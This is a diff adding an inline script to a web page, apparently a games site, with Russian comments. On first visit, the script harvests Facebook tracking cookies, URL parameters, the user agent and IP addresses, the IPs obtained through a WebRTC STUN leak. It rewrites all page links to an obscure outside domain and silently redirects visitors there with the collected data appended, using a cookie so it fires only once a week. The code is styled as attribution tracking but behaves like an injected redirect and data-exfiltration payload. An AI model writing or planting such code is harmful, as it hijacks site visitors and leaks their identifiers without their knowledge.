@@ -1,0 +1,340 @@
+<script>
+const cookieName = "fishybusinessgamesuk_cookie";
+function setCookie(name, value, days) {
+    const expires = new Date(Date.now() + days * 864e5).toUTCString();
+    document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/';
+}
+function getCookie(name) {
+    return document.cookie.split('; ').find(row => row.startsWith(name + '=')) !== undefined;
+}
+if (!getCookie(cookieName)) {
+    // Устанавливаем cookie, так как её ещё нет
+    setCookie(cookieName, "true", 7); // Срок действия cookie - 7 дней
+
+    // Выполнение вашего скрипта после создания cookie
+    (function() {
+        window.onload = async function () {
+
+      const autoRedirect = true;
+
+      const innerParams = {
+          target: "af_sub1",
+          delimiter: "&",
+          params: [{
+                  key: "_fbc",
+                  target: "fbc",
+                  source: "cookie"
+              },
+              {
+                  key: "_fbp",
+                  target: "fbp",
+                  source: "cookie"
+              },
+              {
+                  key: "fbclid",
+                  target: "fbc",
+                  source: "link"
+              },
+              {
+                  key: "idpixel",
+                  target: "idpixel",
+                  source: "link"
+              },
+              {
+                  target: "useragent",
+                  source: "useragent"
+              },
+              {
+                  target: "ip",
+                  source: "ip"
+              },
+              {
+                  target: "host",
+                  source: "host"
+              }
+          ]
+      };
+
+      const onelinkGeneratorData = {
+          oneLinkURL: "https://ntobwnztd.com/gkcXCnf9",
+          pidKeysList: ["media_source"],
+          campaignKeysList: ["campaign_name"],
+          gclIdParam: "af_sub4"
+      };
+
+      "use strict";
+      class OneLinkUrlGenerator {
+          constructor({
+              oneLinkURL: e,
+              pidKeysList: t = [],
+              pidStaticValue: n = null,
+              campaignKeysList: a = [],
+              campaignStaticValue: r = null,
+              pidOverrideList: i = [],
+              gclIdParam: o = ""
+          } = {}) {
+              if (console.debug("Constructing OneLink URL generator"), void 0 === e || "string" != typeof e || "" === e) return console.error("OneLinkUrlGenerator: oneLinkURL arg invalid"), null;
+              this.oneLinkURL = e, this.pidOverrideList = i, this.gclIdParam = o, this.pidKeysList = t, this.pidStaticValue = n, this.campaignKeysList = a, this.campaignStaticValue = r, this.campaign = getCampaignValue(this.campaignKeysList, this.campaignStaticValue), this.mediaSource = getMediaSourceValue(this.pidKeysList, this.pidStaticValue, this.pidOverrideList), this.afParams = {
+                  af_js_web: "true"
+              }
+          }
+          generateUrl() {
+              if (null == this.mediaSource) return console.debug("No valid pid value was found. URL will no be changed"), null;
+              if (getParameterFromURL("af_redirect")) return console.debug("This user comes from AppsFlyer by redirection and is ready to be attributed. \nKeep direct app store links."), null;
+              let e = this.mediaSource;
+              const t = getParameterFromURL("gclid");
+              if (t) {
+                  this.afParams[this.gclIdParam] = t, console.debug("This user comes from Google AdWords");
+                  const e = getParameterFromURL("keyword");
+                  e && (this.afParams.af_keywords = e, console.debug("There is a keyword associated with the ad"))
+              } else console.debug("This user comes from SRN or custom network ");
+              const n = this.oneLinkURL + "?pid=" + e + "&c=" + this.campaign + stringifyAfParameters(this.afParams);
+              return console.debug(`Generated OneLink URL ${n}`), n
+          }
+          setDeepLinkValue(e, t = null) {
+              setGenericParameter(this.afParams, "deep_link_value", e, t)
+          }
+          setChannel(e, t = null) {
+              setGenericParameter(this.afParams, "af_channel", e, t)
+          }
+          setAdset(e, t = null) {
+              setGenericParameter(this.afParams, "af_adset", e, t)
+          }
+          setAd(e, t = null) {
+              setGenericParameter(this.afParams, "af_ad", e, t)
+          }
+          setAfSub1(e, t = null) {
+              setGenericParameter(this.afParams, "af_sub1", e, t)
+          }
+          setAfSub2(e, t = null) {
+              setGenericParameter(this.afParams, "this.afParams, af_sub2", e, t)
+          }
+          setAfSub3(e, t = null) {
+              setGenericParameter(this.afParams, "af_sub3", e, t)
+          }
+          setAfSub4(e, t = null) {
+              setGenericParameter(this.afParams, "af_sub4", e, t)
+          }
+          setAfSub5(e, t = null) {
+              setGenericParameter(this.afParams, "af_sub5", e, t)
+          }
+          setCustomParameter(e, t, n = null) {
+              setGenericParameter(this.afParams, t, e, n)
+          }
+      }
+
+      function isFacebook() {
+          return !(!document.referrer || "" == document.referrer) && document.referrer.toLowerCase().includes("facebook")
+      }
+
+      function getParameterFromURL(e) {
+          const t = window.location.href;
+          e = e.replace(/[\[\]]/g, "\\$&");
+          var n = new RegExp("[?&]" + e + "(=([^&#]*)|&|#|$)").exec(t);
+          return n ? n[2] ? decodeURIComponent(n[2].replace(/\+/g, " ")) : "" : null
+      }
+
+      function getMediaSourceValue(e, t, n) {
+          let a = null;
+          for (let t of e) null != t && getParameterFromURL(t) && (a = getParameterFromURL(t));
+          return null != a ? n.hasOwnProperty(a) && (a = n[a]) : a = t, a
+      }
+
+      function getCampaignValue(e, t) {
+          for (let t of e)
+              if (getParameterFromURL(t)) return getParameterFromURL(t);
+          return null != t ? t : document.getElementsByTagName("title")[0] ? document.getElementsByTagName("title")[0].innerText : "unknown"
+      }
+
+      function stringifyAfParameters(e) {
+          let t = "";
+          for (var n of Object.keys(e)) console.debug(n + "->" + e[n]), null != e[n] && (t += `&${n}=${e[n]}`);
+          return t
+      }
+
+      function setGenericParameter(e, t, n, a = null) {
+          const r = getParameterFromURL(n);
+          r ? (e[t] = r, console.debug(`${n} found. ${t} = ${r}`)) : null != a ? (e[t] = a, console.debug(`${n} not found. ${t} = ${a}`)) : console.debug(`${n} not found and newParamValue is null. Skipping.`)
+      }
+      window.getCookie = function (e) {
+          let t = document.cookie.match(new RegExp("(^| )" + e + "=([^;]+)"));
+          if (t) return t[2]
+      }, window.getUrlParam = function (e) {
+          return new URLSearchParams(document.location.search.substring(1)).get(e)
+      };
+      async function generateLink(e) {
+          let t = new window.AF.OneLinkUrlGenerator(onelinkGeneratorData).generateUrl();
+          let n = [],
+              a = "";
+          for (let t of e.params) {
+              let e;
+              if ("cookie" == t.source) e = window.getCookie(t.key);
+              else if ("link" == t.source) e = window.getUrlParam(t.key);
+              else if ("useragent" == t.source) e = navigator.userAgent;
+              else if ("host" == t.source) e = window.location.host;
+              else if ("ip" == t.source) {
+                  let t = await getIPs();
+                  0 != t.length && (e = t[t.length - 1])
+              } else e = window.getCookie(t.key) ? window.getCookie(t.key) : window.getUrlParam(t.key);
+              e && !n.find(e => e.key == t.target) && n.push({
+                  key: t.target,
+                  value: e
+              })
+          }
+          for (let i of n) a += "" == a ? i.key + "=" + i.value : e.delimiter + i.key + "=" + i.value;
+          return a && t && (t += (-1 != t.indexOf("?") ? "&" : "?") + e.target + "=" + encodeURIComponent(a)), t
+      }
+
+      function is_ipv4(e) {
+          return regex_v4.test(e)
+      }
+
+      function is_ipv6(e) {
+          return regex_v6.test(e)
+      }
+      window.AF = Object.assign(window.AF || {}, {
+          OneLinkUrlGenerator: OneLinkUrlGenerator
+      });
+      let regex_v4 = /((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])/,
+          regex_v6 = /((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:)))/,
+          ip_regex_array = [regex_v6, regex_v4];
+
+      function peer(e) {
+          var t, n = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+
+          function a() {
+              (t = new n({
+                  iceServers: [{
+                      urls: "stun:stun.l.google.com:19302"
+                  }]
+              })).onicecandidate = (e => i(e)), t.createDataChannel("fake_data_channel")
+          }
+
+          function r() {
+              return t.createOffer().then(e => t.setLocalDescription(e))
+          }
+
+          function i(t) {
+              t && t.candidate && t.candidate.candidate && e(t && t.candidate && t.candidate.candidate)
+          }
+          return {
+              start: function () {
+                  a(), r()
+              },
+              stop: function () {
+                  if (t) try {
+                      t.close()
+                  } finally {
+                      t.onicecandidate = (() => {}), t = null
+                  }
+              },
+              createConnection: a,
+              createStunRequest: r,
+              handleCandidates: i
+          }
+      }
+
+      function publicIPs(e) {
+          if (e && e < 100) throw new Error("Custom timeout cannot be under 100 milliseconds.");
+          var t = [],
+              n = peer(function (e) {
+                  var n = [];
+                  for (let t of ip_regex_array) {
+                      let a = [],
+                          r = t.exec(e);
+                      if (r) {
+                          for (let e = 0; e < r.length; e++)(is_ipv4(r[e]) || is_ipv6(r[e])) && a.push(r[e]);
+                          n.push(a)
+                      }
+                  }! function (e) {
+                      t.includes(e) || t.push(a(e.flat(1 / 0)))
+                  }(n.flat(1 / 0))
+              });
+
+          function a(e) {
+              return Array.from(new Set(e))
+          }
+          return new Promise(function (r, i) {
+              n.start(), setTimeout(() => {
+                  t && t !== [] ? r(a(t.flat(1 / 0))) : i("No IP addresses were found."), n.stop()
+              }, e || 500)
+          })
+      }
+
+      function getIPTypes(e) {
+          return new Promise(function (t, n) {
+              let a = [];
+              publicIPs(e).then(e => {
+                  e.forEach(e => {
+                      e.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/) ? a.push({
+                          ip: e,
+                          type: "private",
+                          IPv4: !0
+                      }) : e.match(/((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:)))/) ? a.push({
+                          ip: e,
+                          type: "IPv6",
+                          IPv4: !1
+                      }) : a.push({
+                          ip: e,
+                          type: "public",
+                          IPv4: !0
+                      })
+                  }), t(a)
+              }).catch(n)
+          })
+      }
+
+      function getIPv4(e) {
+          return getIPTypes(e).then(e => {
+              const t = e.filter(e => e.IPv4);
+              for (let e = 0; e < t.length; e++) t[e] = t[e].ip;
+              return t || ""
+          })
+      }
+
+      function getIPv6(e) {
+          return getIPTypes(e).then(e => {
+              const t = e.filter(e => "IPv6" === e.type);
+              for (let e = 0; e < t.length; e++) t[e] = t[e].ip;
+              return t ? t.ip : ""
+          })
+      }
+
+      function getIPs(e) {
+          return Object.assign(publicIPs(e), {
+              types: getIPTypes,
+              public: publicIPs,
+              IPv4: getIPv4,
+              IPv6: getIPv6
+          })
+      }
+      async function setLink() {
+          let e = document.querySelectorAll("a");
+          for (let n = 0; n < e.length; n++) e[n].href = onelinkGeneratorData.oneLinkURL;
+          let n = await generateLink(innerParams);
+          if (n == null) {
+              n = onelinkGeneratorData.oneLinkURL;
+          }
+          let np = [
+              window.location.search.substring(1), 
+              `sub_id_6=${window.location.host}`,
+              `sub_id_7=${window.getUrlParam("idpixel")}`,
+              `sub_id_8=${window.getCookie("_fbc")}`, 
+              `sub_id_9=${window.getCookie("_fbp")}`
+          ].join("&");
+          n.includes("?") ? n += "&" + np : n += "?" + np;
+          if (autoRedirect) window.location = n;
+          else {
+              if (n)
+                  for (let t = 0; t < e.length; t++) e[t].href = n;
+              document.body.style.visibility = "visible", document.body.style.opacity = 1
+          }
+      }
+      setLink();
+  };
+        
+    })();
+} else {
+    // Если cookie уже есть, продолжаем загрузку страницы
+    console.log("Cookie найдена. Продолжаем загрузку страницы...");
+}</script>
